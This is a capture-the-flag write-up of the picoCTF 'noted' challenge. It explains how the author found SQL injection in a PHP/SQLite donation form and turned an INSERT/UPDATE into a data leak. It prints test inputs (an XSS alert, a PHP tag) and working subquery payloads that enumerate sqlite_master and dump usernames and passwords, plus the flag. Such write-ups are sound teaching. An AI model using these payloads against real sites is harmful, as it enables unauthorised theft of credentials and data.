    Introduction

    The entire challenge description for this one was just: "Do you want to fund my startup?" That's it. No hints about the vulnerability type, no obvious attack surface. Just a question and an inconspicous login page.

    Challenge Name: noted
    Platform: picoCTF
    Difficulty: Hard
    Category: Web Exploitation

    This one took me a little over an hour, and it was genuinely one of my favorite challenges so far. No hints, a completely self-directed path from blank page to flag, and some of my cleanest SQLi yet.

    Let's go.


    Gobuster First

    Skipping that first gobuster scan had burned me enough times before; by now I'd learned.

    gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt

    It found .hta, .htaccess, and .htpasswd. All were returning 403, as expected since those are protected Apache files, but more importantly, I now knew the app was running PHP. Maybe that could be helpful.

    Walking the App

    The main page had a login form POSTing to index.php, and a registration link up top pointing to /register.php. Oddly, there was already an "Invalid Login" message displayed before I'd even tried anything. Looking at the response in Burp Suite, I did also see a freshly assigned PHPSESSID. It took me a second, but I realized that meant the app was probably doing something with $_SESSION on page load—maybe that was important.

    I poked at the login form briefly—tried admin/foo, tried submitting with only a username, only a password—nothing interesting, though. No error messages, no behavior change. The login form seemed to just be a login form. Crazy, I know.

    So I registered an account: user=jerry&pass=mouse. It sent me back to the index page with a new prompt: "Thank you for volunteering, you can fund us with as much money as you'd like." On this index page was now a number input and a submit button, POSTing to contribute.php.

    I donated $5 and watched the request in Burp; there were two POST parameters: moneys=5 and captcha=36. That captcha value was interesting—looking at the source, it was coming from a hidden form field that changed on every page refresh, kinda like a CSRF token.

    The page now showed: "You're latest contribution: $5"

    Side note - it's your, dammit. Smh.


    It seemed like the moneys value was being reflected directly on the page—that's always interesting. Since it was just an HTML form, I pulled up the web inspector and changed the input type from number to text and just started throwing stuff at it.

    Testing for Injection

    • Input hello — "You're latest contribution: $hello". Ok, so that confirms the value is being reflected, and it's unsanitized too. Fun combination.
    • Input <?php echo "Hello from PHP"; ?> — "You're latest contribution: $". Alright, something happened, but no output.
    • Input <script>alert("XSS")</script> — the page just froze while loading, indefinitely. I had to cancel. That script tag definitely did something.
    • Input " — that just reflected literally, nothing interesting
    • Input ; — literally nothing
    • Input ' — HEY, there we go!
    Warning: SQLite3::query(): Unable to prepare statement: 1,
near "jerry": syntax error in /var/www/html/contribute.php on line 11

    A single quote and the database explodes. Classic.

    That error message was really generous—it revealed the file path, the line number, the database type (SQLite3), and the fact that my username "jerry" was somehow embedded in the query. And the moneys field was being inserted into a query that already contained my username. One could infer, then, that this was probably an INSERT or UPDATE statement, not a SELECT. That complicated things a little.


    Understanding the Query Structure

    Before trying payloads, I needed to figure out roughly what the query looked like. The error mentioning "jerry" in the same statement as my moneys input suggested something like:

    INSERT INTO some_table (money) VALUES (moneys) WHERE username='jerry'

    Or maybe it was an UPDATE statement, who knows. Either way, my input was probably going into a string field, since placing a single quote in my input broke things. I confirmed this by trying the good ol' '-- payload as input—the SQL error disappeared and the "latest contribution" text went blank; the comment had cleanly eliminated the rest of the query.

    So I was working with a quoted string context, in what was probably an INSERT/UPDATE, with output reflected back through the "latest contribution" display. The question was: how do I turn this write operation into a read operation so that I can exfiltrate data?

    The Humble SQLite Subquery

    I needed a way to exfiltrate data through a field that was storing and reflecting my input. I learned that in SQLite, you can concatenate strings with ||—so if I could close my quoted string and somehow concatenate sensitive database info onto it, that sensitive info would get stored and then reflected back on the page.

    And that's when I learned that subqueries are a thing. Conceptually:

    ' || (some subquery that returns data);--

    The single quote closes my input string; the || can then concatenate the result of the subquery onto my input, and the ;-- would effectively terminate the query there. I had the tools I needed—now I just had to figure out how to use them.

    Enumerating the Database

    First, find what tables exist in the first place:

    ' || (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1);--

    That spit out: startup_users. One table—that was it. That made things easier. Now we get its schema:

    ' || (SELECT sql FROM sqlite_master WHERE tbl_name='startup_users' AND type='table' LIMIT 1);--

    That gave us:

    CREATE TABLE startup_users (nameuser text, wordpass text, money int)

    Three columns. Coool. Now I could dump the whole table row by row:

    ' || (SELECT nameuser FROM startup_users LIMIT 1 OFFSET 0) || ' pwd: ' || (SELECT wordpass FROM startup_users LIMIT 1 OFFSET 0) || ' money: ' || (SELECT money FROM startup_users LIMIT 1 OFFSET 0);--

    That handed me the first row. From there, I just ran it a bunch more times, incrementing the offset value each time. The table came back as:

    name: admin pwd: password money: 0
name: ron pwd: not_the_flag_db1d1c41 money: null
name: veronica pwd: not_the_flag_de19f38f money: null
name: brick pwd: not_the_flag_6d8cfc3e money: null
...

    There were a lot of entries. A few rows later, though, we got: name: the_real_flag pwd: picoCTF{1_c4nn0t_s33_y0u_58183fce} money: null

    They even named it the_real_flag for me—I appreciated the transparency.


    Manual SQLi, all on my own, without any hints pointing me toward it—that felt genuinely good. This one made me feel like a 'hacker,' lol

    Key Takeaways

    • Always poke at reflected values. The moment I saw $5 echoed back on the page, that field became a suspect. Any reflected user input is worth testing, not just login forms and search boxes. Glad I kept looking.
    • Know your database's quirks. SQLite uses || for string concatenation, not + or CONCAT(). MySQL, PostgreSQL, and SQLite all have slightly different syntax. Thankfully, that one descriptive error message told me what I was dealing with—but if I didn't know what the DBMS was, those differences could've cost me a LOT of troubleshooting.
    • INSERT/UPDATE injection is different from SELECT injection. You can't just UNION SELECT your way to a result set—the query is writing, not reading. But if the written value gets reflected back somewhere on the page, you can subquery into that write and effectively turn it into a read.
    • Manual SQLi is slow but teaches you what SQLMap is doing. Running the same query eight times with different OFFSET values to dump a table manually was somewhat tedious—but it just felt so cool. And now I knew exactly what SQLMap automates, from real experience—not just a THM lab.

    What I'd Do Differently

    I spent a few minutes going down a CSRF bypass rabbit hole when I noticed the captcha token. That was a red herring—the captcha validated fine through normal usage, and the real vulnerability had nothing to do with it. I guess the lesson there is don't chase every suspicious detail at once. Note it, keep it in your back pocket, and keep walking the app first. That was a rabbit hole that had potential to eat a whole hour of my day—meanwhile, the answer was right there on the page staring back at me. Literally.

    Final Thoughts

    No hints, start to finish, just over an hour. For a challenge that gave me nothing but "do you want to fund my startup?" as a starting point, I will absolutely take it. The satisfaction of dumping a database row by row with a payload you built yourself is something that's hard to describe—but it's exactly why I wanted to learn this stuff in the first place.
